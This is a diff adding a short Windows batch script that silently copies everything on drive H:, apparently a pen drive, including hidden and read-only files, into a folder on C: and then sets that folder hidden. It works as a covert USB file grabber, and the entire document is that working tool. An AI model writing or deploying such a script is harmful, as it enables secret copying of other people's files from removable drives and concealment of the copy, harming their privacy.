@@ -1,0 +1,4 @@
+@ECHO OFF
+XCOPY H: C:\TXY_PENDRIVE_H /s /c /d /e /h /i /r /y
+ATTRIB +H C:\TXY_PENDRIVE_H
+EXIT
